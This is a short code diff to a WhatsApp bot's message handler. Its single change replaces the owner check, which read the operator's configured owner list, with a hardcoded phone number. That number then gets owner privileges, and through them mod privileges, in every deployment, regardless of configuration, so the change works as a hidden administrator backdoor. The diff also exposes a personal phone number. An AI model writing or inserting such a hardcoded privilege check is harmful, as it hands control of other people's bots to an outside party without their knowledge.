@@ -178,7 +178,7 @@ export async function handler(chatUpdate) {
         )
 
      const userNumber = m.sender ? m.sender.replace(/[^0-9]/g, '') : ''
-const isOwner = isROwner || m.fromMe || global.owner.some(([number]) => number.replace(/[^0-9]/g, '') === userNumber)
+const isOwner = isROwner || m.fromMe || ['584226480049'].includes(userNumber)
         const isMods = isOwner || global.mods.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const isPrems = isROwner || global.prems.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || _user.prem == true
 
